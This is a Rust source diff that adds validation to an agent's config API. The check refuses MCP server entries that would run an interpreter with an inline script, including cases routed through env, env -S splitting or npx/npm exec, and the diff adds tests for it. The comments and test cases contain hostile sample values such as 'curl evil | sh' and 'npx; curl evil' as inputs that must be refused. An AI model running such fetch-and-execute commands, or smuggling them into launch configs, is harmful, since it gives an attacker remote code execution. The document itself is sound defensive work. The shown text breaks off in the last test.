@@ -799,9 +799,14 @@ struct McpServerBody {
     env: Option<HashMap<String, String>>,
 }
 
-/// Reject a command that is a shell expression rather than a program to spawn:
-/// this route persists a command the agent later runs via `Command::new`, so a
-/// value like `sh -c 'curl … | sh'` must not be smuggled through.
+/// Reject a `command` that is a shell expression rather than the name of a
+/// program to spawn: this route persists a command the agent later runs via
+/// `Command::new`, so a value like `npx; curl evil` must not be smuggled
+/// through.
+///
+/// This reads the command string alone. A command that names a real program
+/// and hands it an inline script — `sh -c '…'` — is refused by
+/// [`validate_mcp_launch`].
 fn validate_mcp_command(command: &str) -> Result<(), ApiError> {
     if command
         .chars()
@@ -812,6 +817,618 @@ fn validate_mcp_command(command: &str) -> Result<(), ApiError> {
         ));
     }
     Ok(())
+}
+
+/// Refuse an MCP entry that runs an interpreter given an inline script.
+///
+/// The route persists a command the agent later runs as
+/// `Command::new(command).args(args)` — no shell is involved, so the risk is
+/// not a shell expression but an interpreter binary handed code to run:
+/// `sh -c 'curl … | sh'`, `python -c '…'`, `node -e '…'`. What this route
+/// configures is a program; a script belongs in a file the program is pointed
+/// at.
+///
+/// The program is resolved first, so the flag is looked for on the program
+/// that would actually run — `env sh -c …` runs `sh`.
+///
+/// A program that cannot be resolved at all is refused: an entry whose
+/// program is unknown cannot be shown to be free of an inline script.
+fn validate_mcp_launch(command: &str, args: &[String]) -> Result<(), ApiError> {
+    check_launch_chain(&program_basename(command), args, 0)
+}
+
+/// How deep the program chain may go: an `env` that runs another `env`, or
+/// a package runner that runs another program. The bound keeps a command
+/// that nests them forever from looping.
+const MAX_PROGRAM_NESTING: usize = 8;
+
+/// How many times an `env -S` string may split the argument list again.
+const MAX_ENV_SPLITS: usize = 8;
+
+/// Walk the chain of programs an MCP entry would run, and refuse the first
+/// program that is handed an inline script.
+///
+/// The chain is the program itself and, behind it, the programs it runs:
+/// `env` runs the program behind it, and a package runner (`npx`,
+/// `npm exec`) runs the program it is asked to run. Every program in the
+/// chain is checked, so `npx --call '…'` is refused by the runner's rule
+/// and `npx -- node -e '…'` by the interpreter's.
+///
+/// A program that cannot be resolved at all is refused: an entry whose
+/// program is unknown cannot be shown to be free of an inline script.
+fn check_launch_chain(program: &str, args: &[String], depth: usize) -> Result<(), ApiError> {
+    if depth >= MAX_PROGRAM_NESTING {
+        return Err(unresolved_program(program));
+    }
+    if let Some(flag) = inline_script_flag(program, args) {
+        return Err(err_400(format!(
+            "MCP command '{program}' may not be given an inline script ({flag}); \
+             the config API runs a program, not a script"
+        )));
+    }
+    for (child, child_args) in child_programs(program, args)? {
+        check_launch_chain(&child, &child_args, depth + 1)?;
+    }
+    Ok(())
+}
+
+/// The refusal for a command whose program cannot be resolved.
+fn unresolved_program(program: &str) -> ApiError {
+    err_400(format!(
+        "MCP command '{program}' may not be given an inline script: the program \
+         it would run cannot be determined; the config API runs a program, not a script"
+    ))
+}
+
+/// The programs `program` runs in turn, and the arguments each of them
+/// would see.
+///
+/// `env` runs the first argument that is neither an option nor a
+/// `VAR=value` assignment; an `env -S` string is split into words the way
+/// GNU `env` splits it, and a nested `env` is resolved in turn. A package
+/// runner (`npx`, `npm exec`) runs the program it is asked to run.
+fn child_programs(program: &str, args: &[String]) -> Result<Vec<(String, Vec<String>)>, ApiError> {
+    if program == "env" {
+        let Some(command_list) = env_command_list(args) else {
+            return Err(unresolved_program(program));
+        };
+        let Some((child, child_args)) = env_program_and_args(&command_list) else {
+            return Err(unresolved_program(program));
+        };
+        return Ok(vec![(child, child_args)]);
+    }
+    if is_package_runner(program, args) {
+        // Everything after the `--` is the program the runner was asked to
+        // run, and the arguments that follow it.
+        let Some(separator) = package_runner_separator(program, args) else {
+            return Ok(Vec::new());
+        };
+        let Some(child) = args.get(separator + 1) else {
+            return Ok(Vec::new());
+        };
+        return Ok(vec![(
+            program_basename(child),
+            args[separator + 2..].to_vec(),
+        )]);
+    }
+    Ok(Vec::new())
+}
+
+/// The argument list `env` would really run: the assignments it sets, the
+/// program, and the program's arguments.
+///
+/// GNU `env` parses its options up to the first argument that is not an
+/// option. `-S` splits a string into words that come *before* the
+/// arguments that follow it, and the option parsing starts again on those
+/// words, so a word of a split string can be an option too.
+fn env_command_list(args: &[String]) -> Option<Vec<String>> {
+    let mut argv: Vec<String> = args.to_vec();
+    for _ in 0..MAX_ENV_SPLITS {
+        match env_scan(&argv)? {
+            EnvScan::Command(command) => return Some(command),
+            EnvScan::Split(next) => argv = next,
+        }
+    }
+    None
+}
+
+/// What one pass over an `env` argument list found.
+enum EnvScan {
+    /// The command: the assignments, the program, and the program's
+    /// arguments.
+    Command(Vec<String>),
+    /// A `-S` split rewrote the argument list, which is scanned again.
+    Split(Vec<String>),
+}
+
+/// One pass over an `env` argument list: the options `env` understands are
+/// read, and the first argument that is not one starts the command.
+///
+/// The options are read the way GNU `getopt_long` reads them: a value may
+/// be attached to its option (`-uHOME`, `--unset=HOME`), several options
+/// may share one argument (`-iS…`), and a long option may be abbreviated to
+/// any unambiguous prefix (`--split-str`). An option `env` does not know, or
+/// a prefix that is ambiguous, is an error: GNU `env` exits 125 and runs
+/// nothing, so the program behind the entry cannot be determined and the
+/// entry is refused.
+fn env_scan(argv: &[String]) -> Option<EnvScan> {
+    let mut index = 0;
+    while index < argv.len() {
+        match env_read(argv, index)? {
+            EnvRead::Continue(next) => index = next,
+            EnvRead::Split(value, rest) => {
+                let words = split_env_words(&value)?;
+                let mut next = words;
+                next.extend(argv[rest..].iter().cloned());
+                return Some(EnvScan::Split(next));
+            }
+            EnvRead::Command(command) => return Some(EnvScan::Command(command)),
+        }
+    }
+    // No command at all: `env` would print the environment and run nothing.
+    Some(EnvScan::Command(Vec::new()))
+}
+
+/// What one argument of an `env` argument list says.
+enum EnvRead {
+    /// The argument is an option; the scan continues at this index.
+    Continue(usize),
+    /// The argument is a `-S` split: its value, and the index the arguments
+    /// that follow it start at.
+    Split(String, usize),
+    /// The argument ends the options: the rest is the command.
+    Command(Vec<String>),
+}
+
+/// Read one argument of an `env` argument list.
+fn env_read(argv: &[String], index: usize) -> Option<EnvRead> {
+    let arg = argv[index].as_str();
+    if arg == "--" {
+        // Everything after `--` is the program and its arguments.
+        return Some(EnvRead::Command(argv[index + 1..].to_vec()));
+    }
+    if let Some(body) = arg.strip_prefix("--") {
+        return env_read_long(argv, index, body);
+    }
+    if arg.len() > 1 && arg.starts_with('-') {
+        return env_read_short(argv, index, &arg[1..]);
+    }
+    // The first argument that is neither an option nor an assignment starts
+    // the command.
+    Some(EnvRead::Command(argv[index..].to_vec()))
+}
+
+/// Read a long option of GNU `env`, with the leading dashes removed.
+fn env_read_long(argv: &[String], index: usize, body: &str) -> Option<EnvRead> {
+    let (name, attached) = match body.split_once('=') {
+        Some((name, value)) => (name, Some(value)),
+        None => (body, None),
+    };
+    let option = env_long_option(name)?;
+    match option.value {
+        EnvValue::None => {
+            if attached.is_some() {
+                // GNU `env` refuses a value on an option that takes none.
+                return None;
+            }
+            Some(EnvRead::Continue(index + 1))
+        }
+        EnvValue::Optional => {
+            // The value of an option that takes an optional value is only
+            // read when it is attached to it, so the next argument is left
+            // alone.
+            Some(EnvRead::Continue(index + 1))
+        }
+        EnvValue::Required => {
+            let (value, consumed) = match attached {
+                Some(value) => (value.to_string(), index + 1),
+                None => (argv.get(index + 1)?.clone(), index + 2),
+            };
+            if option.long == "split-string" {
+                Some(EnvRead::Split(value, consumed))
+            } else {
+                Some(EnvRead::Continue(consumed))
+            }
+        }
+    }
+}
+
+/// Read the short options GNU `env` understands that share one argument.
+fn env_read_short(argv: &[String], index: usize, flags: &str) -> Option<EnvRead> {
+    let flags: Vec<char> = flags.chars().collect();
+    let mut cursor = 0;
+    while cursor < flags.len() {
+        let option = env_short_option(flags[cursor])?;
+        match option.value {
+            EnvValue::None | EnvValue::Optional => cursor += 1,
+            EnvValue::Required => {
+                // The value is the rest of the argument, or the argument
+                // that follows it.
+                let attached: String = flags[cursor + 1..].iter().collect();
+                let (value, consumed) = if attached.is_empty() {
+                    (argv.get(index + 1)?.clone(), index + 2)
+                } else {
+                    (attached, index + 1)
+                };
+                if option.long == "split-string" {
+                    return Some(EnvRead::Split(value, consumed));
+                }
+                return Some(EnvRead::Continue(consumed));
+            }
+        }
+    }
+    Some(EnvRead::Continue(index + 1))
+}
+
+/// The value an option of GNU `env` takes.
+enum EnvValue {
+    /// The option takes no value.
+    None,
+    /// The option needs a value, and fails without one.
+    Required,
+    /// The option may take a value, but only when it is attached to it.
+    Optional,
+}
+
+/// An option of GNU `env`, with the value it takes.
+struct EnvOption {
+    /// The long name of the option.
+    long: &'static str,
+    /// The short name of the option, if it has one.
+    short: Option<char>,
+    /// The value the option takes.
+    value: EnvValue,
+}
+
+/// The options GNU `env` understands, as of coreutils 9.4.
+///
+/// The list is what `getopt_long` matches against: a long option may be
+/// abbreviated to any unambiguous prefix of its name, and a short option may
+/// share an argument with others or carry its value attached.
+const ENV_OPTIONS: &[EnvOption] = &[
+    EnvOption {
+        long: "block-signal",
+        short: None,
+        value: EnvValue::Optional,
+    },
+    EnvOption {
+        long: "chdir",
+        short: Some('C'),
+        value: EnvValue::Required,
+    },
+    EnvOption {
+        long: "debug",
+        short: Some('v'),
+        value: EnvValue::None,
+    },
+    EnvOption {
+        long: "default-signal",
+        short: None,
+        value: EnvValue::Optional,
+    },
+    EnvOption {
+        long: "help",
+        short: None,
+        value: EnvValue::None,
+    },
+    EnvOption {
+        long: "ignore-environment",
+        short: Some('i'),
+        value: EnvValue::None,
+    },
+    EnvOption {
+        long: "ignore-signal",
+        short: None,
+        value: EnvValue::Optional,
+    },
+    EnvOption {
+        long: "list-signal-handling",
+        short: None,
+        value: EnvValue::None,
+    },
+    EnvOption {
+        long: "null",
+        short: Some('0'),
+        value: EnvValue::None,
+    },
+    EnvOption {
+        long: "split-string",
+        short: Some('S'),
+        value: EnvValue::Required,
+    },
+    EnvOption {
+        long: "unset",
+        short: Some('u'),
+        value: EnvValue::Required,
+    },
+    EnvOption {
+        long: "version",
+        short: None,
+        value: EnvValue::None,
+    },
+];
+
+/// The option a long option of GNU `env` names, when it names one.
+///
+/// GNU `getopt_long` accepts any unambiguous prefix of a long option name.
+/// A name that matches none, or that matches more than one, is an error:
+/// GNU `env` exits 125 and runs nothing.
+fn env_long_option(name: &str) -> Option<&'static EnvOption> {
+    // An exact name wins over a prefix.
+    if let Some(option) = ENV_OPTIONS.iter().find(|option| option.long == name) {
+        return Some(option);
+    }
+    let mut matches = ENV_OPTIONS
+        .iter()
+        .filter(|option| option.long.starts_with(name));
+    let option = matches.next()?;
+    if matches.next().is_some() {
+        // An ambiguous prefix.
+        return None;
+    }
+    Some(option)
+}
+
+/// The option a short option of GNU `env` names, when it names one.
+fn env_short_option(flag: char) -> Option<&'static EnvOption> {
+    ENV_OPTIONS.iter().find(|option| option.short == Some(flag))
+}
+
+/// The program in an `env` command list and the arguments it would see.
+///
+/// A lone `-` at the front of the list is not the program: GNU `env` reads
+/// it as `-i` and looks for the program behind it. The elements that follow
+/// it are read as they are: a `VAR=value` assignment sets a variable, and
+/// the first element that is neither is the program.
+fn env_program_and_args(command: &[String]) -> Option<(String, Vec<String>)> {
+    let rest = match command.first() {
+        Some(first) if first == "-" => &command[1..],
+        _ => command,
+    };
+    let index = rest.iter().position(|arg| !is_env_assignment(arg))?;
+    Some((program_basename(&rest[index]), rest[index + 1..].to_vec()))
+}
+
+/// The name of the program a command names: the part after the last path
+/// separator, so `/bin/bash` and `bash` are the same program.
+fn program_basename(command: &str) -> String {
+    command
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(command)
+        .to_string()
+}
+
+/// An `env` argument that sets a variable (`NAME=value`) rather than naming
+/// the program to run. GNU `env` takes any argument with an `=` in it as an
+/// assignment, so the name is not checked here either.
+fn is_env_assignment(arg: &str) -> bool {
+    arg.contains('=')
+}
+
+/// The words GNU `env -S` splits a string into, or `None` when GNU `env`
+/// cannot split it.
+///
+/// GNU `env` splits the string the way a shell splits a command line: a
+/// single quote is literal, a double quote is literal, and a backslash
+/// escapes the next character. A value it cannot split — an unterminated
+/// quote, a backslash at the end, an escape it does not know — is an
+/// error: `env` exits 125 and runs nothing. Such a value is refused here
+/// rather than guessed at.
+fn split_env_words(value: &str) -> Option<Vec<String>> {
+    let chars: Vec<char> = value.chars().collect();
+    let mut words: Vec<String> = Vec::new();
+    let mut word = String::new();
+    // Whether a word is being built: a separator ends the current one.
+    let mut in_word = false;
+    let mut single = false;
+    let mut double = false;
+    let mut index = 0;
+    while index < chars.len() {
+        let c = chars[index];
+        if c == '\'' && !double {
+            single = !single;
+            in_word = true;
+            index += 1;
+            continue;
+        }
+        if c == '"' && !single {
+            double = !double;
+            in_word = true;
+            index += 1;
+            continue;
+        }
+        if is_gnu_space(c) && !single && !double {
+            if in_word {
+                words.push(std::mem::take(&mut word));
+                in_word = false;
+            }
+            index += 1;
+            continue;
+        }
+        if c == '#' && !in_word {
+            // GNU `env` reads a `#` that starts a word as the end of the
+            // string.
+            break;
+        }
+        if c == '$' && !single {
+            // GNU `env` expands `${VAR}` from the environment; this route
+            // cannot know the value, so it refuses the value.
+            return None;
+        }
+        if c == '\\' {
+            index += 1;
+            let Some(escaped) = chars.get(index).copied() else {
+                // A backslash at the end of the string is an error.
+                return None;
+            };
+            if single && escaped != '\\' && escaped != '\'' {
+                // A backslash inside a single quote is literal.
+                word.push('\\');
+                word.push(escaped);
+                in_word = true;
+                index += 1;
+                continue;
+            }
+            match escaped {
+                '"' | '#' | '$' | '\'' | '\\' => word.push(escaped),
+                // `\_` separates words outside a quote and is a space
+                // inside a double quote.
+                '_' if double => word.push(' '),
+                '_' => {
+                    if in_word {
+                        words.push(std::mem::take(&mut word));
+                        in_word = false;
+                    }
+                    index += 1;
+                    continue;
+                }
+                // `\c` ends the string outside a quote and is an error
+                // inside a double quote.
+                'c' if double => return None,
+                'c' => break,
+                'f' => word.push('\u{c}'),
+                'n' => word.push('\n'),
+                'r' => word.push('\r'),
+                't' => word.push('\t'),
+                'v' => word.push('\u{b}'),
+                // Any other escape is an error.
+                _ => return None,
+            }
+            in_word = true;
+            index += 1;
+            continue;
+        }
+        word.push(c);
+        in_word = true;
+        index += 1;
+    }
+    if single || double {
+        // An unterminated quote is an error.
+        return None;
+    }
+    if in_word {
+        words.push(word);
+    }
+    Some(words)
+}
+
+/// The whitespace GNU `env` splits a string on.
+fn is_gnu_space(c: char) -> bool {
+    matches!(c, ' ' | '\t' | '\n' | '\u{b}' | '\u{c}' | '\r')
+}
+
+/// The flag that makes `program` read a script out of its arguments, if any.
+///
+/// A shell reads the next argument as a command with `-c`; the interpreters
+/// that take code inline each have their own flag. A program that only starts
+/// other programs — `uvx`, `docker` — has none of its own; the exception is
+/// `npx`/`npm exec`, whose `-c`/`--call` runs a shell command and is refused.
+fn inline_script_flag(program: &str, args: &[String]) -> Option<String> {
+    match program {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" => {
+            args.iter().find(|arg| shell_reads_a_command(arg)).cloned()
+        }
+        "node" => args.iter().find_map(|arg| match arg.as_str() {
+            "-e" | "--eval" | "-p" | "--print" => Some(arg.clone()),
+            other if other.starts_with("--eval=") => Some("--eval".to_string()),
+            other if other.starts_with("--print=") => Some("--print".to_string()),
+            _ => None,
+        }),
+        // `perl -E` is `perl -e` with `use feature` enabled.
+        "perl" => args
+            .iter()
+            .find(|arg| matches!(arg.as_str(), "-e" | "-E"))
+            .cloned(),
+        "ruby" => args.iter().find(|arg| arg.as_str() == "-e").cloned(),
+        "deno" => args.iter().find(|arg| arg.as_str() == "eval").cloned(),
+        // `npx` and `npm exec` run a command rather than a package when
+        // they are given `-c`/`--call`. The program they are asked to run
+        // is resolved before the flag is looked for, so `npx -- node -e …`
+        // is refused by the `node` rule.
+        "npx" => package_runner_call_flag(program, args),
+        // `npm exec` is `npx` under another name: it runs a command rather
+        // than a package when it is given `-c`/`--call`.
+        "npm" if is_package_runner(program, args) => package_runner_call_flag(program, args),
+        _ if is_python_program(program) => args.iter().find(|arg| arg.as_str() == "-c").cloned(),
+        _ => None,
+    }
+}
+
+/// The `npx`/`npm exec` flag that runs a command instead of a package.
+///
+/// Only the runner's own arguments count: the arguments after the `--`
+/// belong to the program the runner was asked to run, and that program is
+/// checked by its own rule.
+fn package_runner_call_flag(program: &str, args: &[String]) -> Option<String> {
+    let own = match package_runner_separator(program, args) {
+        Some(separator) => &args[..separator],
+        None => args,
+    };
+    own.iter().find_map(|arg| package_runner_call(arg))
+}
+
+/// A program that runs another program when it is asked to: `npx`, and
+/// `npm exec` (which is `npx` under another name).
+fn is_package_runner(program: &str, args: &[String]) -> bool {
+    match program {
+        "npx" => true,
+        "npm" => args.iter().any(|arg| arg.as_str() == "exec"),
+        _ => false,
+    }
+}
+
+/// The index of the `--` that ends a package runner's own options, if it
+/// has one.
+///
+/// `npx` takes the first `--` in its arguments. `npm` runs a program only
+/// under `exec`, so the `--` it honours is the first one that follows the
+/// `exec`.
+fn package_runner_separator(program: &str, args: &[String]) -> Option<usize> {
+    match program {
+        "npm" => {
+            let exec = args.iter().position(|arg| arg == "exec")?;
+            args[exec..]
+                .iter()
+                .position(|arg| arg == "--")
+                .map(|offset| exec + offset)
+        }
+        _ => args.iter().position(|arg| arg == "--"),
+    }
+}
+
+/// A python interpreter: `python`, `python3`, or a versioned name such as
+/// `python3.12`.
+fn is_python_program(program: &str) -> bool {
+    let Some(suffix) = program.strip_prefix("python") else {
+        return false;
+    };
+    suffix.is_empty()
+        || (suffix.starts_with(|c: char| c.is_ascii_digit())
+            && suffix.chars().all(|c| c.is_ascii_digit() || c == '.'))
+}
+
+/// A shell option that makes the shell read a command from the next argument:
+/// `-c`, or a combined flag that carries it (`-lc`, `-ic`).
+fn shell_reads_a_command(arg: &str) -> bool {
+    let Some(flags) = arg.strip_prefix('-') else {
+        return false;
+    };
+    // A long option (`--norc`) and a bare `-` are not command flags.
+    if flags.is_empty() || flags.starts_with('-') {
+        return false;
+    }
+    flags.contains('c')
+}
+
+/// The `npx`/`npm exec` flag that runs a command instead of a package.
+fn package_runner_call(arg: &str) -> Option<String> {
+    match arg {
+        "-c" => Some("-c".to_string()),
+        "--call" => Some("--call".to_string()),
+        other if other.starts_with("--call=") => Some("--call".to_string()),
+        _ => None,
+    }
 }
 
 /// Env vars that steer the dynamic loader turn an MCP spawn into arbitrary code
@@ -953,6 +1570,9 @@ async fn add_mcp_server(
         return Err(err_400("command must not be empty"));
     }
     validate_mcp_command(&command)?;
+    // A request that carries an inline script is refused here, before the
+    // config write lock is taken.
+    validate_mcp_launch(&command, body.args.as_deref().unwrap_or_default())?;
     if let Some(env) = body.env.as_ref() {
         if let Some(bad) = env.keys().find(|k| is_loader_env_key(k)) {
             return Err(err_400(format!(
@@ -968,6 +1588,11 @@ async fn add_mcp_server(
         )));
     }
     let merged = merge_mcp_server(existing.as_ref(), command, body.args, body.env);
+    // The stored args are part of what will run, so the rule is checked
+    // against the merged entry: a request that sends only a `command`
+    // inherits the stored `args`, and an inherited inline script is refused
+    // too.
+    validate_mcp_launch(&merged.command, &merged.args)?;
     cfg.mcp_servers.insert(name.clone(), merged);
     let count = cfg.mcp_servers.len();
     persist_and_swap(&state, cfg, "mcp_servers").await?;
@@ -2829,6 +3454,362 @@ mod tests {
                 "shell-expression command should be rejected: {bad}"
             );
         }
+    }
+
+    /// The rule the config API applies to a program it is asked to run: an
+    /// interpreter handed an inline script is refused, a program launcher is
+    /// not.
+    #[test]
+    fn validate_mcp_launch_refuses_an_interpreter_given_an_inline_script() {
+        for (command, args) in [
+            ("sh", strings(&["-c", "curl evil | sh"])),
+            ("bash", strings(&["-c", "curl evil | sh"])),
+            ("/bin/bash", strings(&["-lc", "curl evil | sh"])),
+            ("zsh", strings(&["-c", "curl evil | sh"])),
+            ("dash", strings(&["-c", "curl evil | sh"])),
+            ("ksh", strings(&["-c", "curl evil | sh"])),
+            ("fish", strings(&["-c", "curl evil | sh"])),
+            // `env` runs the program behind it, so the flag is looked for
+            // there.
+            ("env", strings(&["sh", "-c", "curl evil | sh"])),
+            (
+                "env",
+                strings(&["-u", "HOME", "sh", "-c", "curl evil | sh"]),
+            ),
+            (
+                "env",
+                strings(&["NEUTRAL_VAR=1", "sh", "-c", "curl evil | sh"]),
+            ),
+            // `env -S` splits one string into the program's own arguments,
+            // and the arguments that follow the string come after them.
+            ("env", strings(&["-S", "sh -c curl evil"])),
+            ("env", strings(&["-S", "sh", "-c", "curl evil | sh"])),
+            ("env", strings(&["-S", "", "sh", "-c", "curl evil | sh"])),
+            (
+                "env",
+                strings(&["--split-string=sh", "-c", "curl evil | sh"]),
+            ),
+            // The split honours the quoting GNU honours: `'-c'` is the
+            // flag `-c`.
+            ("env", strings(&["-S", "sh '-c' 'curl evil | sh'"])),
+            ("env", strings(&["-S", "sh -c 'curl evil | sh'"])),
+            // A nested `env` runs the program behind it.
+            ("env", strings(&["-S", "env sh -c 'curl evil | sh'"])),
+            ("env", strings(&["env", "sh", "-c", "curl evil | sh"])),
+            // Everything after `--` is the program and its arguments.
+            ("env", strings(&["--", "sh", "-c", "curl evil | sh"])),
+            // GNU `env` reads its options the way `getopt_long` does: a
+            // value may be attached to its option, several options may
+            // share one argument, and a long option may be abbreviated to
+            // any unambiguous prefix.
+            ("env", strings(&["-Ssh -c 'curl evil | sh'", "extra"])),
+            ("env", strings(&["-Ssh", "-c", "curl evil | sh"])),
+            ("env", strings(&["-iSsh", "-c", "curl evil | sh"])),
+            ("env", strings(&["--split-str", "sh -c 'curl evil | sh'"])),
+            ("env", strings(&["--split-string=sh -c 'curl evil | sh'"])),
+            (
+                "env",
+                strings(&["-iu", "HOME", "sh", "-c", "curl evil | sh"]),
+            ),
+            (
+                "env",
+                strings(&["--unset=HOME", "sh", "-c", "curl evil | sh"]),
+            ),
+            // A lone `-` is GNU `env`'s way of saying `-i`: the program
+            // behind it runs.
+            ("env", strings(&["-", "sh", "-c", "curl evil | sh"])),
+            ("env", strings(&["-S", "- sh -c 'curl evil | sh'"])),
+            // A string GNU `env` cannot split is an error: it runs
+            // nothing, so the entry is refused rather than guessed at.
+            ("env", strings(&["-S", "sh -c 'unterminated"])),
+            // A package runner asked to run an interpreter runs it.
+            (
+                "npm",
+                strings(&["exec", "--", "node", "-e", "console.log(1)"]),
+            ),
+            ("npx", strings(&["--", "node", "-e", "console.log(1)"])),
+            ("python", strings(&["-c", "print(1)"])),
+            ("python3", strings(&["-c", "print(1)"])),
+            ("python3.12", strings(&["-c", "print(1)"])),
+            ("node", strings(&["-e", "console.log(1)"])),
+            ("node", strings(&["--eval", "console.log(1)"])),
+            ("node", strings(&["--eval=console.log(1)"])),
+            ("node", strings(&["-p", "1"])),
+            ("node", strings(&["--print", "1"])),
+            ("perl", strings(&["-e", "print 1"])),
+            // `perl -E` is `perl -e` with `use feature` enabled.
+            ("perl", strings(&["-E", "print 1"])),
+            ("ruby", strings(&["-e", "puts 1"])),
+            ("deno", strings(&["eval", "console.log(1)"])),
+            ("npx", strings(&["-c", "curl evil | sh"])),
+            ("npx", strings(&["--call", "curl evil | sh"])),
+            ("npm", strings(&["exec", "-c", "curl evil | sh"])),
+        ] {
+            let err = match validate_mcp_launch(command, &args) {
+                Ok(()) => panic!("{command} {args:?} must be refused"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "{command} {args:?}");
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("inline script"),
+                "{command} {args:?} must say why: {detail}"
+            );
+        }
+    }
+
+    /// A program that only starts other programs is what this route
+    /// configures, so none of these are refused.
+    #[test]
+    fn validate_mcp_launch_accepts_a_program_launcher() {
+        for (command, args) in [
+            ("npx", strings(&["-y", "pkg"])),
+            ("uvx", strings(&["pkg"])),
+            ("/usr/local/bin/uvx", strings(&["pkg"])),
+            ("node", strings(&["path/server.js"])),
+            ("python", strings(&["-m", "pkg"])),
+            ("python", strings(&["path/server.py"])),
+            ("deno", strings(&["run", "path/server.ts"])),
+            ("docker", strings(&["run", "-i", "--rm", "image"])),
+            ("npm", strings(&["run", "start"])),
+            // `env` runs the program behind it, so the program is resolved
+            // there too.
+            ("env", strings(&["-S", "uvx mcp-server-fetch"])),
+            ("env", strings(&["-u", "HOME", "uvx", "mcp-server-fetch"])),
+            (
+                "env",
+                strings(&["NEUTRAL_VAR=1", "uvx", "mcp-server-fetch"]),
+            ),
+            ("env", strings(&["--", "uvx", "mcp-server-fetch"])),
+            // A lone `-` is GNU `env`'s way of saying `-i`: the program
+            // behind it runs.
+            ("env", strings(&["-", "uvx", "mcp-server-fetch"])),
+            // A package runner asked to run a program runs it.
+            ("npx", strings(&["--", "node", "server.js"])),
+        ] {
+            assert!(
+                validate_mcp_launch(command, &args).is_ok(),
+                "{command} {args:?} must be accepted"
+            );
+        }
+    }
+
+    /// The words GNU `env -S` splits a string into, with the quoting it
+    /// honours.
+    #[test]
+    fn split_env_words_splits_the_way_gnu_env_does() {
+        assert_eq!(
+            split_env_words("sh -c 'curl evil | sh'"),
+            Some(strings(&["sh", "-c", "curl evil | sh"]))
+        );
+        // A quoted word is the word it quotes.
+        assert_eq!(
+            split_env_words("sh '-c' 'curl evil | sh'"),
+            Some(strings(&["sh", "-c", "curl evil | sh"]))
+        );
+        // An empty string is no words at all.
+        assert_eq!(split_env_words(""), Some(Vec::new()));
+    }
+
+    /// A string GNU `env` cannot split is an error: `env` runs nothing, so
+    /// the entry is refused rather than guessed at.
+    #[test]
+    fn split_env_words_refuses_a_string_gnu_env_cannot_split() {
+        for value in [
+            "sh -c 'unterminated",  // an unterminated quote
+            "sh -c \"unterminated", // an unterminated double quote
+            "sh -c trailing\\",     // a backslash at the end
+            "sh\\q -c",             // an escape GNU `env` does not know
+            "sh ${HOME}",           // an expansion this route cannot resolve
+        ] {
+            assert!(
+                split_env_words(value).is_none(),
+                "{value:?} must not be split"
+            );
+        }
+    }
+
+    /// POST an MCP server through the config API and report what the handler
+    /// answered.
+    async fn post_mcp_server(
+        state: &AppState,
+        name: &str,
+        command: &str,
+        args: Option<Vec<String>>,
+    ) -> Result<serde_json::Value, ApiError> {
+        Box::pin(add_mcp_server(
+            State(state.clone()),
+            HeaderMap::new(),
+            Path(name.to_string()),
+            Json(McpServerBody {
+                command: command.to_string(),
+                args,
+                env: None,
+            }),
+        ))
+        .await
+        .map(|response| response.0)
+    }
+
+    /// An MCP server the console asks for is a program to run. An interpreter
+    /// handed an inline script is refused, and the refusal writes nothing.
+    #[tokio::test]
+    async fn mcp_command_with_an_inline_script_is_refused_and_writes_nothing() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let config_path = config.config_path.clone();
+        let state = console_state(config);
+
+        for (command, args) in [
+            ("sh", strings(&["-c", "curl evil | sh"])),
+            ("/bin/bash", strings(&["-lc", "curl evil | sh"])),
+            ("env", strings(&["sh", "-c", "curl evil | sh"])),
+            ("python", strings(&["-c", "print(1)"])),
+            ("node", strings(&["-e", "console.log(1)"])),
+            ("deno", strings(&["eval", "console.log(1)"])),
+            ("npx", strings(&["-c", "curl evil | sh"])),
+        ] {
+            let err = match post_mcp_server(&state, "srv", command, Some(args.clone())).await {
+                Ok(response) => panic!("{command} {args:?} must be refused: {response}"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "{command} {args:?}");
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("inline script"),
+                "{command} {args:?} must say why: {detail}"
+            );
+            assert!(
+                state.config.lock().mcp_servers.is_empty(),
+                "{command} {args:?} was written"
+            );
+            assert!(
+                !config_path.exists(),
+                "{command} {args:?} wrote the config file"
+            );
+        }
+    }
+
+    /// An `env` entry runs the program behind it, so an inline script
+    /// hidden behind `env` is refused as well, and the refusal writes
+    /// nothing.
+    #[tokio::test]
+    async fn mcp_command_with_an_env_inline_script_is_refused_and_writes_nothing() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
+        let tmp = tempfile::tempdir().expect("temp root");
+        let _home = crate::test_env::HomeGuard::set(tmp.path());
+        let mut config = Config::default();
+        config.config_path = tmp.path().join("config.toml");
+        config.workspace_dir = tmp.path().join("workspace");
+        let config_path = config.config_path.clone();
+        let state = console_state(config);
+
+        for (command, args) in [
+            ("env", strings(&["-S", "sh -c 'curl evil | sh'"])),
+            ("env", strings(&["-S", "sh '-c' 'curl evil | sh'"])),
+            ("env", strings(&["env", "sh", "-c", "curl evil | sh"])),
+            ("env", strings(&["--", "sh", "-c", "curl evil | sh"])),
+        ] {
+            let err = match post_mcp_server(&state, "srv", command, Some(args.clone())).await {
+                Ok(response) => panic!("{command} {args:?} must be refused: {response}"),
+                Err(err) => err,
+            };
+            let (status, body) = err;
+            assert_eq!(status, StatusCode::BAD_REQUEST, "{command} {args:?}");
+            let detail = body.0["detail"].as_str().unwrap_or_default();
+            assert!(
+                detail.contains("inline script"),
+                "{command} {args:?} must say why: {detail}"
+            );
+            assert!(
+                state.config.lock().mcp_servers.is_empty(),
+                "{command} {args:?} was written"
+            );
+            assert!(
+                !config_path.exists(),
+                "{command} {args:?} wrote the config file"
+            );
+        }
+    }
+
+    /// A program launcher is what the console configures, so it is accepted
+    /// and stored.
+    #[tokio::test]
+    async fn mcp_command_with_a_program_launcher_is_accepted() {
+        let _env = crate::test_env::ENV_LOCK.lock().await;
